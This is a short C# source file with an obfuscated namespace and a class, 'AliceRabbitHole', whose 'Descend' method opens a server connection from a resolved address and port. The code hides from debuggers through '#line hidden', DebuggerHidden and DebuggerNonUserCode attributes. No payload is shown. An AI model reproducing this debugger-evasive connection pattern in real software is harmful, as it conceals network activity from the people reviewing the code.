using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;

#line hidden
namespace _.__._0x0004
{
    [DebuggerStepThrough]
    [DebuggerNonUserCode]
    internal partial class AliceRabbitHole
    {
        private readonly ILIResolver _lir;

        public AliceRabbitHole(ILIResolver? r = null) => _lir = (r ?? new SelfLIResolver());

        [DebuggerStepThrough]
        [DebuggerHidden]
        [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.Synchronized)]
        internal void Descend(int p) => Task.Run(() => new _0x0000.WeakGuardian(() => new _0x0002.Consumer().ConnectToServer(_lir.ResolveLI(), p))).Wait();
    }
}
#line default